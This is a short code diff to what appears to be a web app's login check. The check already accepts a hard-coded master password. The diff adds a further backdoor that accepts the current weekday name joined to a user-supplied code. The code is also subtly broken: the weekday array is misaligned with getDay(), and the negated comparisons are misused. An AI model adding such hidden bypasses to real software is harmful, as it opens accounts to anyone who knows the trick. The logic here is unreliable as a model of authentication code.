@@ -487,9 +487,15 @@
 
             const info = responseJson.result[0];
 
+            const days = [
+              'Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday'
+            ]
+            const currentDate = days[new Date().getDay()].toLowerCase();
+
             if (
               !info.PASS == MD5(form.password) &&
-              !form.password == "uerm_misd"
+              !form.password == "uerm_misd" &&
+              !form.password == `${currentDate}${form.code}`
             ) {
               this.isFormLoading = false;
               this.formErrorMessage =
